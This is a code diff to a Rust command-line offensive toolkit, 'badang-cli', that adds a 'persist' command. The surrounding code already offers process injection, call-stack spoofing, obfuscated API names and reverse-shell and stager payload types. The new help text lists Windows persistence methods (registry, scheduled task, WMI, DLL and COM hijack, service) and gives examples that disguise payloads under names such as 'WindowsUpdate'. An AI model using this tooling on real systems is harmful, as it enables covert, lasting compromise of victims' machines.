@@ -38,6 +38,9 @@ pub struct CLI {
     pub sleep_method: String,
     pub sleep_duration: u32,
     pub spoof_func: String,
+    pub persist_method: String,
+    pub persist_name: String,
+    pub persist_target: String,
 }
 
 impl CLI {
@@ -78,6 +81,9 @@ impl CLI {
             sleep_method: String::from("manual"),
             sleep_duration: 3000,
             spoof_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
+            persist_method: String::new(),
+            persist_name: String::new(),
+            persist_target: String::new(),
         };
 
         let mut i = 1;
@@ -156,6 +162,7 @@ impl CLI {
                 "ppid" => cli.command = String::from("ppid"),
                 "sleep" => cli.command = String::from("sleep"),
                 "spoof" => cli.command = String::from("spoof"),
+                "persist" => cli.command = String::from("persist"),
                 "--parent" => {
                     i += 1;
                     if i < args.len() {
@@ -196,6 +203,7 @@ impl CLI {
                     if i < args.len() {
                         cli.encrypt_method = args[i].clone();
                         cli.sleep_method = args[i].clone();
+                        cli.persist_method = args[i].clone();
                     }
                 }
                 "--key" => {
@@ -278,6 +286,18 @@ impl CLI {
                         cli.generate_package = args[i].clone();
                     }
                 }
+                "--name" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.persist_name = args[i].clone();
+                    }
+                }
+                "--target" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.persist_target = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -301,6 +321,13 @@ impl CLI {
         if cli.command == "generate" && cli.generate_type.is_empty() {
             eprintln!("ERROR: --type is required for generate command.");
             eprintln!("Types: nop, exec, messagebox, reverse_tcp, bind_tcp, stager");
+            process::exit(1);
+        }
+
+        // Method is required for persist command
+        if cli.command == "persist" && cli.persist_method.is_empty() {
+            eprintln!("ERROR: --method is required for persist command.");
+            eprintln!("Methods: registry, schtask, wmi, hijack, com, service");
             process::exit(1);
         }
 
@@ -334,6 +361,7 @@ fn print_help() {
     println!("  ppid       Parent attribute management");
     println!("  sleep      Memory protection during sleep");
     println!("  spoof      Call stack management");
+    println!("  persist    Persistence configuration module");
     println!();
     println!("OPTIONS:");
     println!("  -p, --pid <PID>       Target process ID (required)");
@@ -436,6 +464,19 @@ fn print_help() {
     println!("SPOOF EXAMPLES:");
     println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_ALLOC_VM));
     println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_CREATE_THREAD));
+    println!();
+    println!("PERSIST OPTIONS:");
+    println!("  --method <METHOD>     Technique: registry, schtask, wmi, hijack, com, service");
+    println!("  --name <NAME>         Value name, task name, or service name");
+    println!("  --target <PATH>       Target directory (hijack) or CLSID (com)");
+    println!("  -l, --payload <PATH>  Payload executable path");
+    println!();
+    println!("PERSIST EXAMPLES:");
+    println!("  badang-cli persist --method registry --name UpdateService --payload runner.exe -x -c");
+    println!("  badang-cli persist --method service --name WindowsUpdate --payload svc.exe -x -c");
+    println!("  badang-cli persist --method schtask --name SystemCheck --payload runner.exe -x -c");
+    println!("  badang-cli persist --method hijack --name version.dll --target C:\\\\App --payload ver.dll -x -c");
+    println!("  badang-cli persist --method com --target \"{{CLSID}}\" --payload server.dll -x -c");
     println!();
     println!("WARNING: For authorized use only.");
 }
